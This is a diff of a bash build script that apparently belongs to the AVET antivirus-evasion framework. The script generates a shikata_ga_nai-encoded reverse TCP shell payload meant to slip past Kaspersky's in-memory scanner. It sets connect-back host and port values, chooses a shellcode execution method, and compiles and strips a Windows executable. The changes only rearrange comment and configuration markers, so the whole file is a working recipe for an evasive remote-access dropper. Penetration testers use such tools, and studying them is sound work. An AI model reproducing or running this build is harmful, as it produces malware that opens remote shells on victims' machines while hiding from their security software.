@@ -1,5 +1,10 @@
-#!/bin/bash          
+#!/bin/bash
+
+
+#DESCRIPTION_START
 # This is (was) for kaspersky, since meterpreter is recognized by in memory scanner.
+#DESCRIPTION_END
+
 
 # print AVET logo
 cat banner.txt
@@ -15,9 +20,15 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# enable debug output
+enable_debug_print
+#CONFIGURATION_END
+
 
 # make shell tcp reverse payload, encoded with shikata_ga_nai
 # additionaly to the avet encoder, further encoding should be used
@@ -50,12 +61,13 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode
 
-# enable debug output
-enable_debug_print
-
 # compile to exe file
 $win32_compiler -o output/kaspersky_fopen_shellrevtcp_win32.exe source/avet.c
 strip output/kaspersky_fopen_shellrevtcp_win32.exe
 
 # cleanup
 cleanup_techniques
+
+#USAGE_START
+TODO
+#USAGE_END
